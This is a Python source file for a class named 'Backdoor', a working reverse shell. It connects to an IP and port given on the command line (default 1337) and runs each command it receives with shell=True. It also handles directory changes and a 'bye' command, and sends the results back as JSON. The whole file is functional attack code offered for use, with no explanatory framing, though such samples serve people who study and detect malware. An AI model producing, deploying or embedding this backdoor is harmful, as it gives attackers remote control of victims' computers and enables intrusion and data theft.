import subprocess, sys, socket, json, argparse, os


class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')     
        parser.set_defaults(port = 1337)
        options = parser.parse_args()
        self.ip = options.ip
        self.port = options.port


class Backdoor:
    
    
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.connection.connect((str(ip),int(port)))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def cd(self,path):
        try:
            print('path:',path)
            fullPath = path[1:] # path will be everything following cd command
            print('fullPath:',fullPath)
            fullPathJoin = ' '.join(fullPath)
            print('fullPathJoin:',fullPathJoin)
            os.chdir(path)
            return f"Changing directory\n>>\"{path}\""
        except PermissionError:
            self.sendStream('PermissionError, change directory command not accepted by target')
        except FileNotFoundError:
            self.sendStream('FileNotFoundError, change directory command not accepted by target')
        except OSError:
            self.sendStream('OSError, change directory command not accepted by target')
            
        

    def executeCmd(self,cmd):
        cmd = subprocess.check_output(cmd,shell=True)
        return cmd
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.connection.send(str(jsData).encode('utf-8'))


    def recvStream(self):
        jsData = ''
        while True:
            try:
                recvData = self.connection.recv(1024)
                recvData = recvData.decode()
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                continue


    def run(self):
        while True:
            #print('run1')
            self.cmdIn = self.recvStream()
            #print(cmdIn)
            #print('run2')
            if self.cmdIn[0] == 'bye':
                #print('bye')
                self.connection.close()
                exit()
            elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:

                #print('trying CD') #meaning cmdIn = ['cd','c:\\'] is len() = 2
                self.cmdOut = self.cd(self.cmdIn[1]) #must pass in the entire absolute path for the argument of cd
                self.sendStream(self.cmdOut)
            else:   
                #print('run3_PRE_TRY')
                try:
                    self.cmdOut = self.executeCmd(self.cmdIn)
                except subprocess.CalledProcessError:
                    self.sendStream('Subprocess Error, shell command not accepted by target')  
                #print('run4_POST_TRY')
                self.cmdOut = self.cmdOut.decode('utf-8')
                #print(cmdOut)
                self.sendStream(self.cmdOut)
                   


try:
    args = Args()
    backdoor = Backdoor(args.ip,args.port)
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()


